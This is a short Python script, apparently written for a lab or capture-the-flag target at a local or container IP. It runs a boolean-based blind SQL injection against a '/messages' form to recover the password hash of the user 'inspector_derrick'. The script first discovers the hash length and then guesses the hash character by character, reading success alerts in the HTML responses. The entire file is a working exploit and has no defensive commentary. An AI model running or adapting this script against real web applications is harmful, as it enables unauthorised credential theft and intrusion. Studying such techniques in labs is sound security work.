import sys
import requests
from bs4 import BeautifulSoup


# Set parameters
ip = "172.17.0.2" if len(sys.argv) > 1 else "127.0.0.1"
url = "http://" + ip + "/messages"
username = 'inspector_derrick'

# Find length of the password
for i in range(5, 100):
    # Prepare data for POST
    data = {'name': "' or " + str(i) + " in (select length(password) from users where name='" + username + "') -- "}
    # Make the request
    r = requests.post(url, data)
    # Parse the received html and check if we get a success message
    soup = BeautifulSoup(r.text, 'html.parser')
    if len(soup.findAll('div', {'class': 'alert-success'})) > 0:
        pwd_len = i
        break

# Brute-force each character of the password
charset = [chr(ord('0')+i) for i in range(10)] + [chr(ord('a')+i) for i in range(6)]
pwd = ''
for pos in range(1, pwd_len + 1):
    for c in charset:
        # Generate data for POST
        data = {'name': "' or '" + c + "' in (select substring(password, " + str(pos) + ", 1) from users where name='" + username + "') -- "}
        # Make the request
        r = requests.post(url, data)
        # Parse the received html and check if we get a success message
        soup = BeautifulSoup(r.text, 'html.parser')
        if len(soup.findAll('div', {'class': 'alert-success'})) > 0:
            pwd += c
            break

# Print the password
print(pwd)
